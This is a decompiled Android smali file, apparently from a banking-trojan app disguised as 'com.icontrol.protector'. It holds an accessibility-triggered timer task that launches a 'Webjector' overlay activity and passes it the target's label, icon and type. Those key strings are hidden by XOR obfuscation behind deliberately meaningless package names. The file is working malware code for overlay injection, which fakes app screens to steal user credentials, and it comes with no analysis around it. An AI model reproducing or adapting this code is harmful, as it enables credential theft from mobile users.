.class Lcom/icontrol/protector/AccessServices$b;
.super Ljava/util/TimerTask;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/AccessServices;->onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Ljava/lang/String;

.field final synthetic g:Ljava/lang/String;

.field final synthetic h:[B

.field final synthetic i:Lcom/icontrol/protector/AccessServices;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[B)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$b;->i:Lcom/icontrol/protector/AccessServices;

    iput-object p2, p0, Lcom/icontrol/protector/AccessServices$b;->e:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/AccessServices$b;->f:Ljava/lang/String;

    iput-object p4, p0, Lcom/icontrol/protector/AccessServices$b;->g:Ljava/lang/String;

    iput-object p5, p0, Lcom/icontrol/protector/AccessServices$b;->h:[B

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices$b;->e:Landroid/content/Context;

    const-class v2, Lcom/icontrol/protector/Webjector;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v1, 0x5

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    iget-object v4, p0, Lcom/icontrol/protector/AccessServices$b;->f:Ljava/lang/String;

    invoke-virtual {v0, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$b;->g:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    iget-object v4, p0, Lcom/icontrol/protector/AccessServices$b;->h:[B

    invoke-virtual {v0, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[B)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v2, v3, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/4 v4, 0x0

    const/16 v5, 0x2e

    aput-byte v5, v2, v4

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices$b;->i:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :array_0
    .array-data 1
        0x63t
        0x70t
        0x7ct
        0x3bt
        -0x42t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x0t
        0x5t
        0x6t
        0x52t
        -0x26t
        0x5bt
        -0x66t
        -0x6dt
    .end array-data

    :array_2
    .array-data 1
        -0x7ft
        -0x69t
        0x31t
        0x3ct
        -0x74t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x13t
        -0xat
        0x53t
        0x59t
        -0x20t
        0x17t
        0x16t
        -0x68t
    .end array-data

    :array_4
    .array-data 1
        -0x7ct
        0x40t
        0x57t
        -0x3bt
    .end array-data

    :array_5
    .array-data 1
        -0x13t
        0x23t
        0x38t
        -0x55t
        -0x34t
        -0x53t
        0x10t
        -0x26t
    .end array-data

    :array_6
    .array-data 1
        0x12t
        0x6bt
        -0x1ct
        0x74t
    .end array-data

    :array_7
    .array-data 1
        0x66t
        0x12t
        -0x6ct
        0x11t
        -0x22t
        0x64t
        0x3t
        -0x51t
    .end array-data

    :array_8
    .array-data 1
        0x5bt
        0x50t
        0x7dt
        -0x34t
        0x39t
        0x2et
        -0x5t
        -0x8t
    .end array-data
.end method
